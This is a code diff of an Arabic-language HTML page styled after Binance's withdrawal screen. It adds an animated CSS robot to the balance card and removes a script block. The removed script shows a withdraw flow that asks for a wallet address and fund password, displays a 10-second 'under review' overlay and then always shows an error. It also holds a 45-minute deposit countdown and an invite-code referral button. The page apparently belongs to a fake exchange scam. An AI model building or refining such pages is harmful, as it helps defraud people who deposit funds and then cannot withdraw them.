@@ -15,7 +15,108 @@
       margin-bottom: 20px;
       text-align: right;
       border: 1px solid #2b3139;
+      position: relative; /* لضمان تموضع الروبوت داخله بدقة */
+      overflow: hidden;
     }
+    
+    /* --- أكواد الروبوت المتحرك الشفاف المطور بالكامل --- */
+    .robot-container {
+      position: absolute;
+      left: 15px;
+      top: 15px;
+      width: 70px;
+      height: 90px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: transparent;
+      z-index: 10;
+    }
+    .robot-body-css {
+      width: 55px;
+      height: 60px;
+      background: #eef1f5;
+      border-radius: 40px 40px 45px 45px;
+      position: relative;
+      box-shadow: inset -3px -3px 7px rgba(0,0,0,0.1), 0 3px 10px rgba(0,0,0,0.15);
+    }
+    .robot-body-css::before {
+      content: '';
+      position: absolute;
+      top: 12px;
+      left: -6px;
+      width: 9px;
+      height: 20px;
+      background: #eef1f5;
+      border-radius: 10px 0 0 10px;
+      transform: rotate(-10deg);
+    }
+    .robot-body-css::after {
+      content: '';
+      position: absolute;
+      top: 12px;
+      right: -6px;
+      width: 9px;
+      height: 20px;
+      background: #eef1f5;
+      border-radius: 0 10px 10px 0;
+      transform: rotate(10deg);
+    }
+    .screen-face {
+      position: absolute;
+      top: 14px;
+      left: 7px;
+      width: 41px;
+      height: 26px;
+      background: #0d1117;
+      border-radius: 15px;
+    }
+    .eye {
+      position: absolute;
+      top: 10px; 
+      width: 9px;
+      height: 5px;
+      background: #00d2ff;
+      border-radius: 50%;
+      box-shadow: 0 0 5px #00d2ff, 0 0 10px #00d2ff;
+      animation: blink-animation 4s infinite ease-in-out;
+    }
+    .left-eye { left: 7px; }  
+    .right-eye { right: 7px; } 
+    @keyframes blink-animation {
+      0%, 95%, 100% { transform: scaleY(1); }
+      97% { transform: scaleY(0.1); } 
+    }
+    .cyan-flame-container {
+      position: absolute;
+      bottom: 5px;
+      width: 40px;
+      height: 30px;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      z-index: -1;
+    }
+    .flame {
+      position: absolute;
+      bottom: 30px;
+      width: 5px;
+      height: 5px;
+      background: #00d2ff;
+      border-radius: 50%;
+      filter: blur(1px);
+      box-shadow: 0 0 5px #00d2ff;
+      opacity: 0;
+    }
+    .particle-1 { left: 12px; animation: float-down 1.4s infinite linear; }
+    .particle-2 { left: 17px; animation: float-down 1.8s infinite linear 0.4s; }
+    .particle-3 { left: 22px; animation: float-down 1.6s infinite linear 0.2s; }
+    @keyframes float-down {
+      0% { transform: translateY(0) scale(1.2); opacity: 1; }
+      100% { transform: translateY(25px) scale(0.2); opacity: 0; }
+    }
+    /* --- نهاية أكواد الروبوت --- */
+
     .balance-label {
       color: #848e9c !important;
       font-size: 14px;
@@ -148,19 +249,37 @@
       font-size: 16px;
       font-weight: bold;
     }
+    @keyframes fadeInBox {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
   </style>
 </head>
 <body>
-
-<!-- شاشة الانتظار لعملية السحب (10 ثوانٍ) -->
+  <!-- شاشة الانتظار لعملية السحب (10 ثوانٍ) -->
 <div id="loadingOverlay" class="loading-overlay">
   <div class="spinner-circle"></div>
   <div class="loading-text">جاري المراجعه يرجى الانتظار...</div>
 </div>
 
 <div class="withdraw-page-container">
-  <!-- بطاقة الرصيد الداكنة المحدثة مثل الصورة -->
+  <!-- بطاقة الرصيد الداكنة المحدثة مع الروبوت المتحرك -->
   <div class="balance-card">
+    <!-- حاوية الروبوت المدمجة برمجياً ومباشرة -->
+    <div class="robot-container">
+      <div class="robot-body-css">
+        <div class="screen-face">
+          <div class="eye left-eye"></div>
+          <div class="eye right-eye"></div>
+        </div>
+      </div>
+      <div class="cyan-flame-container">
+        <div class="flame particle-1"></div>
+        <div class="flame particle-2"></div>
+        <div class="flame particle-3"></div>
+      </div>
+    </div>
+
     <div class="balance-label">
       Assets, total <i class="fas fa-chevron-up" style="font-size:8px;"></i><i class="fas fa-chevron-down" style="font-size:8px; margin-right:-3px;"></i>
     </div>
@@ -194,7 +313,8 @@
       <button type="button" class="copy-btn" onclick="copyAddress()">نسخ العنوان <i class="far fa-copy"></i></button>
     </div>
   </div>
-    <!-- نموذج طلب السحب المطور -->
+  
+  <!-- نموذج طلب السحب المطور -->
   <form id="withdrawForm" class="withdraw-form" onsubmit="event.preventDefault();">
     <div class="form-group">
       <label class="group-label">Network</label> 
@@ -225,7 +345,6 @@
     <div style="margin-top: 20px; text-align: center; padding-bottom: 20px;">
       <button type="button" onclick="showInviteCode()" style="width: 100%; background-color: #0066ee !important; color: white !important; padding: 14px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; font-size: 16px;">أضـافه أعـضاء</button>
       
-      <!-- الصندوق الاحترافي لعرض الرمز بحركة أنيميشن سلسة -->
       <div id="inviteBox" style="display: none; margin-top: 15px; padding: 12px; background-color: #1e2329; border: 1px solid #2b3139; border-radius: 8px; animation: fadeInBox 0.4s ease-out;">
         <p style="color: #848e9c !important; font-size: 14px; margin: 0 0 8px 0; font-weight: bold;">رمز الدعوه الخاص بك</p>
         <span style="color: #0066ee; font-size: 22px; font-weight: bold; letter-spacing: 1px;">1352HR</span>
@@ -234,7 +353,6 @@
   </form>
 </div>
 
-<!-- شريط التنقل السفلي الأصلي لتطبيقك -->
 <div class="binance-bottom-nav">
   <a href="account.html" class="binance-nav-item">
     <i class="fas fa-user"></i>
@@ -253,78 +371,6 @@
     <span>الرئيسية</span>
   </a>
 </div>
-
-<style>
-  @keyframes fadeInBox {
-    from { opacity: 0; transform: translateY(-10px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-</style>
- 
-<script>
-let timerInterval;
-
-function openDepositSection() {
-  const depositDiv = document.getElementById('depositSection');
-  depositDiv.style.display = 'block';
-  clearInterval(timerInterval);
-  startCountdown(45 * 60);
-  depositDiv.scrollIntoView({ behavior: 'smooth' });
-}
-
-function startCountdown(duration) {
-  let timer = duration, minutes, seconds;
-  const display = document.getElementById('timer');
-  timerInterval = setInterval(function () {
-    minutes = parseInt(timer / 60, 10);
-    seconds = parseInt(timer % 60, 10);
-    minutes = minutes < 10 ? "0" + minutes : minutes;
-    seconds = seconds < 10 ? "0" + seconds : seconds;
-    display.textContent = minutes + ":" + seconds;
-    if (--timer < 0) {
-      clearInterval(timerInterval);
-      display.textContent = "منتهي";
-    }
-  }, 1000);
-}
-
-function copyAddress() {
-  const addrText = document.getElementById('walletAddrText').innerText;
-  navigator.clipboard.writeText(addrText).then(() => {
-    alert("تم نسخ عنوان المحفظة بنجاح!");
-  });
-}
-
-function handleWithdraw() {
-  const address = document.getElementById('walletAddress').value.trim();
-  const password = document.getElementById('fundPassword').value.trim();
-  const errorDiv = document.getElementById('errorMessage');
-  const loader = document.getElementById('loadingOverlay');
-
-  if (address === "" || password === "") {
-      alert("يرجى ملء جميع الحقول المطلوبة أولاً.");
-      return;
-  }
-
-  loader.style.display = 'flex';
-  errorDiv.style.display = 'none';
-
-  setTimeout(() => {
-      loader.style.display = 'none'; 
-      errorDiv.style.display = 'flex'; 
-  }, 10000);
-}
-
-// دالة إظهار الرمز المخصص عند الضغط على زر إضافة أعضاء
-function showInviteCode() {
-  const inviteBox = document.getElementById("inviteBox");
-  if (inviteBox.style.display === "none" || inviteBox.style.display === "") {
-    inviteBox.style.display = "block";
-  } else {
-    inviteBox.style.display = "none";
-  }
-}
-</script>
 
 </body>
 </html>
